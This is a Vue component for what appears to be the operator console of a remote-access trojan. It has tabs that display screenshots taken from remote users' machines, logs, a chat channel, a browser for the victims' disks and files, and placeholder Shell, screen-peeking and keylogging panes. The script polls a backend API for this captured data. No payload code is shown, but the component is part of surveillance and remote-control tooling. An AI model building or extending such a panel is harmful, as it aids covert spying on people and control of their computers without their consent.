<template>
  <div class="sendbox">
    <el-tabs v-model="thisav" class="demo-tabs" @tab-click="handleClick">
      <el-tab-pane label="日志" name="rizhi" class="rizhi_box">
        <ul>
          <li v-for="(item, index) in log_list" :key="index">
            {{ item.msg }}
            <i>{{ time_chuli(item.time) }}</i>
          </li>
        </ul>
      </el-tab-pane>
      <el-tab-pane label="截图" name="jietu" class="jietu_box">
        <div
          class="img_item"
          v-for="(item, index) in img_list"
          :key="index"
          @click="selimg(item)"
        >
          <img :src="'data:image/png;base64,' + item.img" alt="" />
          <div class="jietu_info">
            <p>user: {{ item.user }}</p>
            <p>ip: {{ item.ip }}</p>
            <p>time: {{ time_chuli(item.time) }}</p>
          </div>
        </div>
      </el-tab-pane>
      <el-tab-pane label="聊天" name="chat" class="chat_box">
        <el-tabs
          v-model="editableTabsValue"
          type="card"
          editable
          class="demo-tabs"
          @tab-change="change_tab"
        >
          <el-tab-pane
            v-for="item in editableTabs"
            :key="item.ip"
            :label="item.user + ' - ' + item.ip"
            :name="item.user + '-' + item.ip"
          >
            <div class="msg_box">
              <ul>
                <li v-for="(i, index) in item.content" :key="index">
                  <div class="user_info">
                    <span>user: {{ i.by }}</span>
                    <span>time: {{ i.time }}</span>
                  </div>
                  <div class="msg_con">
                    {{ i.msg }}
                  </div>
                </li>
              </ul>
              <div class="send_input">
                <div class="send_btn_inp">
                  <input
                    type="text"
                    name=""
                    id=""
                    v-model="send_msg"
                    @keyup.enter="send_chat_msg"
                  />
                  <button @click="send_chat_msg">SEND</button>
                </div>
              </div>
            </div>
          </el-tab-pane>
        </el-tabs>
      </el-tab-pane>
      <el-tab-pane label="文件" name="file" class="wenjian_box">
        <div class="path_info">
          <span class="clqh" style="margin-right: 5px">
            <el-button type="success" size="small" @click="path_back"
              >后退</el-button
            >
          </span>
          <span style="margin-right: 5px">{{ path_info.cipan }}</span>
          <span v-for="(item, index) in path_info.path" :key="index">
            {{ item }}
          </span>
          <!-- <button @click="path_info.path = []">清空path</button> -->
        </div>
        <div class="fil_data">
          <ul class="panfu">
            <li v-for="item in cipan.path" :key="item" @click="ck_path(item)">
              {{ item }}
            </li>
          </ul>
          <ul class="wenjian">
            <li
              v-for="(item, index) in list_path"
              :key="index"
              @click="ml_path(item)"
            >
              {{ item }}
            </li>
          </ul>
        </div>
      </el-tab-pane>
      <el-tab-pane label="Shell" name="shell">Shell</el-tab-pane>
      <el-tab-pane label="窥屏" name="look_win">Shell</el-tab-pane>
      <el-tab-pane label="键盘记录" name="keyword">键盘记录</el-tab-pane>
    </el-tabs>
  </div>

  <el-dialog
    v-model="biglog"
    :title="
      '图片详细 ' +
      ' user:' +
      thisimg.user +
      ' ip:' +
      thisimg.ip +
      ' time:' +
      time_chuli(thisimg.time)
    "
    width="90%"
    top="10"
    align-center="true"
  >
    <img class="bigimg" :src="'data:image/png;base64,' + thisimg.img" alt="" />
    <template #footer>
      <span class="dialog-footer">
        <el-button @click="dialogVisible = false">保存本地</el-button>
        <el-button type="primary" @click="dialogVisible = false"
          >删除</el-button
        >
      </span>
    </template>
  </el-dialog>
</template>

<script>
import { reactive, toRefs } from "vue";
import moment from "moment";
import "moment/locale/zh-cn";
moment.locale("zh-cn");
import bus from "@/utils/bus.js";
export default {
  setup() {
    const data = reactive({
      thisav: "rizhi",
      log_list: [],
      // ----截图-----
      img_list: [],
      thisimg: {
        user: "",
        ip: "",
        time: "",
        img: "",
      },
      biglog: false,
      // ---聊天-----
      this_user: "",
      this_ip: "",
      editableTabsValue: "",
      editableTabs: [],
      send_msg: "",
      // ---文件---
      cipan: {},
      list_path: [], // 记录点击的目录路径
      // --路径--
      path_info: {
        cipan: "",
        path: [],
      },
    });
    // 获取 截图-日志-聊天-文件
    setInterval(() => {
      data.img_list = myApi.send_jietu();
      data.log_list = myApi.send_log();
      data.editableTabs = myApi.send_chat();
      let a = myApi.send_cl_files();
      data.cipan = a.path;
      data.list_path = a.file_list;
    }, 300);
    // 时间处理
    const time_chuli = (time) => {
      return moment(time).format("YYYY-MM-DD HH:mm:ss");
    };

    // 点击截图
    const selimg = (val) => {
      data.thisimg.user = val.user;
      data.thisimg.ip = val.ip;
      data.thisimg.time = val.time;
      data.thisimg.img = val.img;
      data.biglog = true;
    };

    // 返回聊天信息
    const send_chat_msg = () => {
      myApi.chat(data.this_user, data.this_ip, data.send_msg);
      data.send_msg = "";
    };
    // 打开指定sendbox
    bus.on("sel_send_window", (val) => {
      data.thisav = val;
    });
    const change_tab = (TabPanelName) => {
      data.this_user = TabPanelName.split("-")[0];
      data.this_ip = TabPanelName.split("-")[1];
    };
    // 点击磁盘
    const ck_path = (path) => {
      data.path_info.path = [];
      data.path_info.cipan = path + ":/";
      console.log(data.path_info);
      myApi.file_read(data.cipan.user, data.cipan.ip, path + ":/");
      console.log(path);
    };
    // 点击目录
    const ml_path = (path) => {
      let aa = path + "/";
      data.path_info.path.push(aa);
      console.log(data.path_info.path);
      let tmp = "";
      if (data.path_info.path.length >= 2) {
        data.path_info.path.forEach((element) => {
          console.log("目录1==" + tmp);
          tmp += element;
          console.log("目录2==" + tmp);
        });
      } else {
        let bb = path + "/";
        tmp = bb;
      }
      myApi.file_read(
        data.cipan.user,
        data.cipan.ip,
        data.path_info.cipan + tmp
      );
      // console.log(path);
    };

    const path_back = () => {
      console.log(data.path_info.path);
      data.path_info.path.pop();
      console.log(data.path_info.path);
      let tmp = "";
      data.path_info.path.forEach((element) => {
        tmp += element + "/";
      });
      myApi.file_read(
        data.cipan.user,
        data.cipan.ip,
        data.path_info.cipan + tmp
      );
    };

    return {
      ...toRefs(data),
      time_chuli,
      selimg,
      send_chat_msg,
      change_tab,
      ck_path,
      ml_path,
      path_back,
    };
  },
};
</script>

<style lang="less" scoped>
.el-tabs {
  height: 100%;
}
.sendbox {
  width: 100%;
  overflow: hidden;
  height: 40%;
  .jietu_box {
    // background: skyblue;
    overflow: auto;
    height: calc(300px - 55px);
    display: flex;
    flex-wrap: wrap;
    .img_item {
      position: relative;
      width: 350px;
      height: 240px;
      border: 1px #fff solid;
      margin-right: 5px;
      margin-bottom: 5px;
      img {
        width: 100%;
        height: 100%;
        object-fit: cover;
      }
      .jietu_info {
        position: absolute;
        bottom: 0;
        left: 0;
        background: rgba(0, 0, 0, 0.4);
        color: #fff;
      }
    }
  }
  .chat_box {
    // background: red;
    height: 100%;
    .msg_box {
      // background: pink;
      height: 100%;
      width: 100%;
      display: flex;
      ul {
        width: 500px;
        height: 100%;
        overflow: auto;
        padding: 5px 0px;
        border-right: 1px #fff solid;
        li {
          list-style: none;
          position: relative;
          border-bottom: 1px solid #fff;
          box-sizing: border-box;
          width: 100%;
          min-height: 50px;
          padding-top: 20px;
          margin-bottom: 10px;
          color: #fff;
          .user_info {
            position: absolute;
            top: 0;
            left: 0;
            border: 1px #fff solid;
            span {
              padding: 0 5px;
              box-sizing: border-box;
              border-right: 1px #fff solid;
            }
          }
        }
      }
      .send_input {
        margin-left: 5px;
        position: relative;
        width: 300px;
        .send_btn_inp {
          width: 100%;
          height: 40px;
          position: absolute;
          bottom: 5px;
          left: 0;
          display: flex;
          input {
            width: 80%;
            border: none;
            outline: none;
            background: none;
            color: #fff;
            padding: 0 5px;
            border: 1px solid skyblue;
          }
          button {
            width: 30%;
          }
        }
      }
    }
  }
  .rizhi_box {
    ul {
      // background: pink;
      height: 100%;
      overflow: auto;
      li {
        border-bottom: 1px #fff solid;
        min-height: 50px;
        position: relative;
        padding-top: 15px;
        color: #fff;
        box-sizing: border-box;
        i {
          position: absolute;
          right: 0;
          top: 0;
          font-size: 14px;
        }
      }
    }
  }
  .wenjian_box {
    .path_info {
      height: 25px;
      background: #fff;
      margin-bottom: 5px;
      color: red;
      font-weight: 700;
      line-height: 25px;
      .clqh {
        margin-right: 5px;
      }
    }
    .fil_data {
      display: flex;
      height: 100%;
      ul {
        li {
          list-style: none;
        }
      }
      .panfu {
        width: 5%;
        height: 100%;
        // background: red;
        text-align: center;
        padding: 10px 0px;
        box-sizing: border-box;
        margin-right: 10px;
        li {
          cursor: pointer;
          margin-bottom: 10px;
          background: #fff;
          transition: all 0.2s;
          &:hover {
            background: skyblue;
          }
        }
      }
      .wenjian {
        width: 95%;
        height: 100%;
        // background: pink;
        overflow: auto;
        li {
          margin-bottom: 5px;
          background: #fff;
          cursor: pointer;
          transition: all 0.2s;
          &:hover {
            background: skyblue;
          }
        }
      }
    }
  }
}

.bigimg {
  width: 100%;
  height: 100%;
  object-fit: cover;
}
/deep/.el-dialog {
  height: 90% !important;
}
/deep/.el-tabs__item {
  color: #fff;
}
/deep/.el-tabs__item.is-active {
  color: skyblue;
}
/deep/.el-tabs__header {
  margin: 0 !important;
}
/deep/.el-tabs__content {
  height: calc(100% - 40px);
}
/deep/.el-tab-pane {
  height: 100% !important;
}
</style>
